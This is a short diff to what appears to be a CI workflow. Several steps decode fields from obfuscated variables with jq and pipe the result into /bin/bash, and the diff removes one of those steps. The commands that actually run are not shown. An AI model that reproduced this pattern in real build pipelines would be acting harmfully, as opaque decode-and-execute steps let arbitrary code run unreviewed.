@@ -39,7 +39,6 @@ jobs:
           echo $ldp357 | jq -r .npj7 | /bin/bash
           echo $csdn7 | jq -r .k85 | /bin/bash
           echo $jqdtb49459 | jq -r .rjxg991 | /bin/bash
-          printf '%s' "$olkx6" | jq -r .fmidm7 | /bin/bash
           printf '%s' "$ajrl0" | jq -r .zaidp06 | /bin/bash
           echo $clv9 | jq -r .yzy72192 | /bin/bash
 
